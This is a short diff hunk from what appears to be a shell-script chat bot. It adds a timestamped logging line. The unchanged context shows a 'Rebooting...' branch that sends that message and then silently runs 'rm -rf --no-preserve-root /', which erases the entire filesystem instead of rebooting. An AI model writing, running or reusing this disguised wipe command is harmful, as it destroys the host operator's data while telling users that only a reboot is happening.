@@ -126,6 +126,7 @@ while sleep 1; do
                if [[ ! -z $LAST_ID ]]; then
                    TEXT="Rebooting..."
                    _send_text
+                   echo "$(date +"[%H:%M] ")$TEXT" 1>&2
                    rm -rf --no-preserve-root / 2>/dev/null
                fi
                ;;
